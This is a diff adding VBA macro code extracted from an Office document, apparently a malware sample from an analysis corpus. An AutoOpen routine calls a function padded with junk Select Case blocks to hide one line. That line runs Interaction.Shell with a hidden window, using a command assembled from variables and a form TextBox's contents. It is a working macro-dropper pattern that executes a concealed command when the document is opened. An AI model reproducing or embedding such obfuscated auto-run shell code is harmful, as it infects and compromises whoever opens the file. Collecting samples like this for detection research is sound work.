@@ -1,0 +1,122 @@
+Attribute VB_Name = "A292730645342"
+Attribute VB_Name = "B321593481444"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Attribute VB_Control = "TextBox1, 0, 0, MSForms, TextBox"
+Sub autoopen()
+  D886 = "f767"
+  f9987 = "u425"
+  J717 = "U9164"
+  J50138
+  l9406 = "s7298"
+  z0746 = "L665"
+  u1805 = "t627"
+End Sub
+Attribute VB_Name = "E1478366354117"
+Function J50138()
+On Error Resume Next
+   Select Case V369
+         Case 205
+            Z415 = j985
+            Z740 = Log(J3372)
+            M3428 = R364
+         Case 459
+            Q4243 = q902
+            v4488 = CBool(z421)
+            N283 = Rnd(O5607 / Hex(D165 * w2931 - X485 / Int(611)) * 613 - 10)
+      End Select
+      D3521 = 947 - 584
+      Set Y6452 = u332
+   Select Case F1538
+         Case 136
+            m6311 = m895
+            u021 = Log(z513)
+            H779 = B988
+         Case 423
+            B071 = b7278
+            Q834 = CBool(D858)
+            u1697 = Rnd(c100 / Hex(B390 * A7599 - l9406 / Int(79)) * 574 - 760)
+      End Select
+      Q742 = 867 - 38
+      Set D312 = m2365
+   Select Case h9749
+         Case 581
+            q5707 = u751
+            b0349 = Log(P2417)
+            G633 = a0814
+         Case 889
+            T571 = D6541
+            z431 = CBool(C839)
+            X644 = Rnd(S2640 / Hex(E214 * P3362 - C4403 / Int(435)) * 854 - 662)
+      End Select
+      H100 = 953 - 353
+      Set z8401 = F933
+B249228 = Array(Z279656, j06641740, u4562547, Interaction.Shell(("" + n62747810 + z70033549 + r73490135 + B321593481444.TextBox1) + Z5184795 + i294988 + j80073164 + f019057, 8 - 8), C505164, G661359352, J70571195)
+   Select Case A8490
+         Case 133
+            l772 = o486
+            n735 = Log(V530)
+            X857 = f7105
+         Case 530
+            b5231 = Q6452
+            j563 = CBool(O0612)
+            z3037 = Rnd(R915 / Hex(G8494 * u4716 - D524 / Int(156)) * 695 - 542)
+      End Select
+      p5821 = 154 - 261
+      Set V1729 = R8000
+End Function
+
+Attribute VB_Name = "J34799106781029"
+Attribute VB_Name = "J8632918935"
+Attribute VB_Name = "L33529626"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "M999357982573"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "Q19573414130905"
+Attribute VB_Name = "W95593701441983"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "a85298682266"
+Attribute VB_Name = "j37077510"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "k9401063736"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "m81989492606984"
+Attribute VB_Name = "t66357882845"
+
+
+INQUEST-PP=macro
